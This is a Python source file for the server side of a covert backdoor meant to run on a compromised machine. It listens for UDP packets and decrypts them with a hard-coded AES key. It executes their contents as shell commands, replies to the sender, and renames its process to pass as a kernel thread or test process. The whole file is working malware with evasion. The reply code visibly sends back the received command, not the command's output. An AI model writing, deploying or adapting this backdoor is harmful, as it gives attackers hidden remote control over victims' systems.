# this is the server portion of the backdoor, runs on a compromised system

import setproctitle
import os
import argparse
import platform
import subprocess
from Crypto.Cipher import AES
from ctypes import *
from scapy.all import *

# user defined section, make these cmd line arguments

# sourcePort
# destinationPort
# interface

# argument parsing
parser = argparse.ArgumentParser(description="This is definitely not a backdoor.")
parser.add_argument('-s'
                   , '--sport'
                   , dest='sourcePort'
                   , help='Source port from sender.'
                   , required=True)
parser.add_argument('-d'
                   , '--dport'
                   , dest='destPort'
                   , help='Destination port sender is sending to.'
                   , required=True)
# parser.add_argument('-i'
#                    , '--interface'
#                    , dest='interface'
#                    , help='Interface to sniff for packets on.')
args = parser.parse_args()
sniffFilter = "udp and src port {0} and dst port {1}".format(args.sourcePort, args.destPort)
encryptionObject = AES.new('This is a key123', AES.MODE_CFB, 'This is an IV456')
decryptionObject = AES.new('This is a key123', AES.MODE_CFB, 'This is an IV456')


def runCommand(packet):
  encryptedData = packet['Raw'].load
  data = decryptionObject.decrypt(encryptedData)
  print "Running command " + data
  output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
  encryptedOutput = encryptionObject.encrypt(output)
  packet = IP(packet[0][1].src)/UDP(dport=int(args.sourcePort), sport=int(args.destPort))/Raw(load=encryptedData)
  send(packet)

# if
def setProcessName():
  operatingSystem = platform.system()
  procName = ""
  if operatingSystem == 'Darwin':
    procName = "testtest"
  elif operatingSystem == "Linux":
    procName = "ksomethingorother"

  setproctitle.setproctitle(procName)

setProcessName()
sniff(filter=sniffFilter, prn=runCommand)
# output = subprocess.check_output('ls -l', shell=True)
# print output